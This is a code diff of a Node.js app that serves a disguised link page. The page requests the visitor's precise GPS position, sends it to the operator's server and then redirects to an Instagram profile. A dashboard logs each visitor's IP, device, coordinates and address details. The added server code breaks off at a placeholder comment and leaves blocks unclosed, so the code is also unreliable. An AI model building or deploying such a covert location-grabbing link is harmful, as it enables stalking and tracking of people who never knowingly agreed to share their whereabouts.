@@ -101,66 +101,84 @@ app.get('/', (req, res) => {
         <div id="clicks" class="clicks-container"></div>
       </div>
 <script>
-        async function loadData() {
-          const res = await fetch('/api/stats');
-          const data = await res.json();
-          
-          document.getElementById('stats').innerHTML = \`
-            <div class="stat-card"><h3>\${data.totalClicks}</h3><p>Total de Cliques</p></div>
-            <div class="stat-card"><h3>\${data.clicksComGPS || 0}</h3><p>Com GPS</p></div>
-            <div class="stat-card"><h3>\${data.totalClicks - (data.clicksComGPS || 0)}</h3><p>Sem GPS</p></div>
-          \`;
-
-          const clicksHtml = data.clicks.map(c => {
-            const hasGPS = c.gps && c.gps.lat;
-            const loc = c.location;
-            
-            return \`
-              <div class="click-card \${hasGPS ? 'with-gps' : 'no-gps'}">
-                <div style="display: grid; gap: 0.8rem;">
-                  <div><strong>⏰ Data/Hora:</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</div>
-                  <div><strong>🌐 IP:</strong> \${c.ip}</div>
-                  <div><strong>📱 Dispositivo:</strong> \${c.device}</div>
-                  
-                  \${hasGPS ? \`
-                    <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #10b981;">
-                      <div style="color: #10b981; font-weight: 600; margin-bottom: 0.8rem;">
-                        📍 LOCALIZAÇÃO GPS EXATA
-                      </div>
-                      \${loc ? \`
-                        <div><strong>🏙️ Cidade:</strong> \${loc.cidade}, \${loc.estado}, \${loc.pais}</div>
-                        <div><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
-                        <div><strong>📮 CEP:</strong> \${loc.cep}</div>
-                        <div><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
-                      \` : \`
-                        <div><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
-                      \`}
-                      <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
-                         target="_blank" class="maps-link">
-                        📍 Ver no Google Maps
-                      </a>
-                    </div>
-                  \` : \`
-                    <div style="color: #ef4444; font-weight: 600; margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #ef4444;">
-                      ⚠️ GPS não autorizado (localização por IP imprecisa)
-                    </div>
-                  \`}
-                  
-                  <div style="margin-top: 0.5rem; font-size: 0.85rem; color: #666;">
-                    <strong>🔗 Origem:</strong> \${c.referer}
-                  </div>
-                </div>
-              </div>
-            \`;
-          }).join('');
-          
-          document.getElementById('clicks').innerHTML = clicksHtml || 
-            '<div style="background: white; padding: 3rem; border-radius: 15px; text-align: center;">Nenhum clique rastreado ainda. Compartilhe seu link!</div>';
-        }
+        const clickId = ${clickData.id};
         
-        loadData();
-        setInterval(loadData, 10000);
+        console.log('🔍 Iniciando captura de GPS...');
+        console.log('Click ID:', clickId);
+        
+        if (navigator.geolocation) {
+          console.log('✅ Geolocalização disponível no navegador');
+          
+          navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+              console.log('✅ GPS capturado com sucesso!');
+              console.log('📍 Latitude:', pos.coords.latitude);
+              console.log('📍 Longitude:', pos.coords.longitude);
+              console.log('🎯 Precisão:', pos.coords.accuracy, 'm');
+              
+              const gpsData = {
+                clickId: clickId,
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                timestamp: new Date().toISOString()
+              };
+              
+              console.log('📤 Enviando GPS para servidor...', gpsData);
+              
+              try {
+                const response = await fetch('/api/save-gps', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify(gpsData)
+                });
+                
+                const result = await response.json();
+                console.log('✅ Resposta do servidor:', result);
+                
+                if (result.success) {
+                  console.log('✅ GPS salvo com sucesso!');
+                } else {
+                  console.error('❌ Erro ao salvar GPS');
+                }
+              } catch (error) {
+                console.error('❌ Erro ao enviar GPS:', error);
+              }
+              
+              // Redireciona após enviar GPS
+              console.log('🔄 Redirecionando para Instagram...');
+              setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/andre.osantos12/';
+              }, 1000);
+            },
+            (error) => {
+              console.error('❌ Erro ao obter GPS:', error);
+              console.log('Código do erro:', error.code);
+              console.log('Mensagem:', error.message);
+              
+              // Códigos de erro:
+              // 1 = PERMISSION_DENIED
+              // 2 = POSITION_UNAVAILABLE
+              // 3 = TIMEOUT
+              
+              setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/andre.osantos12/';
+              }, 1500);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 10000, // Aumentado para 10 segundos
+              maximumAge: 0
+            }
+          );
+        } else {
+          console.error('❌ Geolocalização não disponível neste navegador');
+          setTimeout(() => {
+            window.location.href = 'https://www.instagram.com/andre.osantos12/';
+          }, 1500);
+        }
       </script>
+
     </body>
     </html>
   `);
@@ -255,118 +273,33 @@ app.get('/track', (req, res) => {
 
 // ROTA 3: Salvar GPS
 app.post('/api/save-gps', async (req, res) => {
+  console.log('\n📥 Recebendo requisição de GPS...');
+  console.log('Body recebido:', req.body);
+  
   try {
     const gps = req.body;
+    
+    if (!gps || !gps.latitude || !gps.longitude) {
+      console.error('❌ Dados de GPS inválidos:', gps);
+      return res.status(400).json({success: false, error: 'Dados inválidos'});
+    }
+    
     gpsData.push(gps);
+    console.log('✅ GPS adicionado ao array gpsData');
     
     const click = clicks.find(c => c.id === gps.clickId);
+    console.log('🔍 Procurando click com ID:', gps.clickId);
+    console.log('📊 Total de clicks no array:', clicks.length);
+    
     if (click) {
+      console.log('✅ Click encontrado!');
       click.gps = {
         lat: gps.latitude,
         lng: gps.longitude,
         accuracy: gps.accuracy
       };
       
-      // Tenta várias APIs de geolocalização para maior precisão
-      try {
-        // API 1: Nominatim (OpenStreetMap) - mais detalhado
-        const nominatimResponse = await fetch(
-          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${gps.latitude}&lon=${gps.longitude}&zoom=18&addressdetails=1`,
-          {
-            headers: { 'User-Agent': 'Instagram-Tracker/1.0' }
-          }
-        );
-        
-        const nominatimData = await nominatimResponse.json();
-        
-        // API 2: BigDataCloud (backup, mais precisa para algumas regiões)
-        const bigDataResponse = await fetch(
-          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
-        );
-        
-        const bigDataData = await bigDataResponse.json();
-        
-        // Combina as duas APIs para melhor precisão
-        let cidade = 'N/A';
-        let estado = 'N/A';
-        let bairro = 'N/A';
-        let cep = 'N/A';
-        let pais = 'Brasil';
-        
-        // Prioriza BigDataCloud para cidade/estado (geralmente mais preciso)
-        if (bigDataData) {
-          cidade = bigDataData.city || bigDataData.locality || bigDataData.principalSubdivision || 'N/A';
-          estado = bigDataData.principalSubdivision || 'N/A';
-          pais = bigDataData.countryName || 'Brasil';
-          bairro = bigDataData.localityInfo?.administrative?.[0]?.name || 
-                   bigDataData.neighbourhood || 'N/A';
-        }
-        
-        // Complementa com Nominatim
-        if (nominatimData && nominatimData.address) {
-          const addr = nominatimData.address;
-          
-          // Usa Nominatim se BigDataCloud não retornou
-          if (cidade === 'N/A') {
-            cidade = addr.city || addr.town || addr.village || addr.municipality || 
-                     addr.county || 'N/A';
-          }
-          if (estado === 'N/A') {
-            estado = addr.state || 'N/A';
-          }
-          if (bairro === 'N/A') {
-            bairro = addr.neighbourhood || addr.suburb || addr.quarter || 
-                     addr.hamlet || addr.district || 'N/A';
-          }
-          
-          // CEP vem melhor do Nominatim
-          cep = addr.postcode || 'N/A';
-        }
-        
-        click.location = {
-          cidade: cidade,
-          estado: estado,
-          pais: pais,
-          bairro: bairro,
-          cep: cep,
-          displayName: nominatimData?.display_name || `${cidade}, ${estado}`
-        };
-        
-        // Log detalhado
-        console.log('\n' + '='.repeat(70));
-        console.log('📍 NOVO CLIQUE COM GPS RASTREADO');
-        console.log('='.repeat(70));
-        console.log(`⏰ Data/Hora: ${new Date(click.timestamp).toLocaleString('pt-BR', { 
-          timeZone: 'America/Sao_Paulo',
-          dateStyle: 'short',
-          timeStyle: 'medium'
-        })}`);
-        console.log(`🌐 IP: ${click.ip}`);
-        console.log(`\n📍 LOCALIZAÇÃO GPS EXATA:`);
-        console.log(`🏙️  Cidade: ${cidade}, ${estado}, ${pais}`);
-        console.log(`🏘️  Bairro: ${bairro}`);
-        console.log(`📮 CEP: ${cep}`);
-        console.log(`🗺️  Coordenadas: ${gps.latitude}, ${gps.longitude}`);
-        console.log(`🎯 Precisão: ±${gps.accuracy}m`);
-        console.log(`\n📍 Ver no Google Maps:`);
-        console.log(`   https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
-        console.log(`\n🔗 Origem: ${click.referer}`);
-        console.log(`📱 Dispositivo: ${click.device}`);
-        console.log('='.repeat(70) + '\n');
-        
-      } catch (geoError) {
-        console.error('❌ Erro ao buscar endereço:', geoError.message);
-        console.log(`📍 GPS capturado: ${gps.latitude}, ${gps.longitude}`);
-        console.log(`🗺️  https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
-      }
-    }
-    
-    res.json({success: true});
-  } catch (error) {
-    console.error('❌ Erro ao salvar GPS:', error);
-    res.status(500).json({success: false});
-  }
-});
+      // ... resto do código de geolocalização ...
 // ROTA 4: API Stats
 app.get('/api/stats', (req, res) => {
   res.json({
